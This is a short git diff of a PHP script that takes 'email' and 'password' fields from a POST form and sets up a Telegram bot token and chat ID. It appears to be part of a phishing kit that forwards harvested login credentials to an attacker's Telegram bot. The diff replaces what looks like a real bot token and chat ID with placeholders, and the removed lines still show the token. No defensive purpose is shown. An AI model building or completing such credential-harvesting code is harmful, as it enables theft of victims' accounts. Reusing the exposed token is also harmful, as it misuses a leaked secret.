@@ -1,7 +1,7 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $botToken = "8146666203:AAGy40dz0ZmhXhYIiuov97eutv_eXazBLiA"; // Replace with your bot token
-    $chatId = "6251271940"; // Replace with your chat ID
+    $botToken = "Telegram_Bot_token"; // Replace with your bot token
+    $chatId = "Telegram_chat_id"; // Replace with your chat ID
     $email = htmlspecialchars($_POST["email"]); // Email input
     $password = htmlspecialchars($_POST["password"]); // Password input
     
